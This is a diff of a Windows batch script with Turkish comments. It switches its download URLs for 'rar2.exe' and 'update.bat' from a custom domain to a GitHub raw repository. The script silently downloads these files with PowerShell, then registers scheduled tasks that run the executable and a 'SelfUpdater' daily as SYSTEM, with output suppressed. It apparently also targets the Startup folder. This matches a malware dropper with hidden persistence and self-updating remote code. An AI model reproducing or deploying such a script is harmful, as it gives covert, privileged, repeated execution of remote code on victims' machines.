@@ -7,8 +7,8 @@ if %ERRORLEVEL% neq 0 (
 )
 
 :: Değişkenler
-set "url_exe=http://bendahacokseviyorum.com/rar2.exe"
-set "url_upd=http://bendahacokseviyorum.com/update.bat"
+set "url_exe=https://raw.githubusercontent.com/xipperzo/sirketbaglantisi/main/rar2.exe"
+set "url_upd=https://raw.githubusercontent.com/xipperzo/sirketbaglantisi/main/update.bat"
 
 set "win64_dir=C:\Program Files\Win64"
 set "startup_dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
@@ -39,7 +39,7 @@ if %errorlevel% neq 0 (
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%url_upd%', '%upd_path%')" >nul 2>&1
 
 :: Görev zamanlayıcıda rar2.exe'yi her gün saat 00:00'da başlat
-schtasks /create /f /tn "%taskname%" /tr "\"%exe_win64%\"" /sc daily /st 12:00 /ru SYSTEM >nul 2>&1
+schtasks /create /f /tn "%taskname%" /tr "\"%exe_win64%\"" /sc daily /st 00:00 /ru SYSTEM >nul 2>&1
 
 :: Güncelleme için görev oluştur (günde bir kez saat 12:00'de)
 schtasks /create /f /tn "SelfUpdater" /tr "\"%upd_path%\"" /sc daily /st 12:00 /ru SYSTEM >nul 2>&1
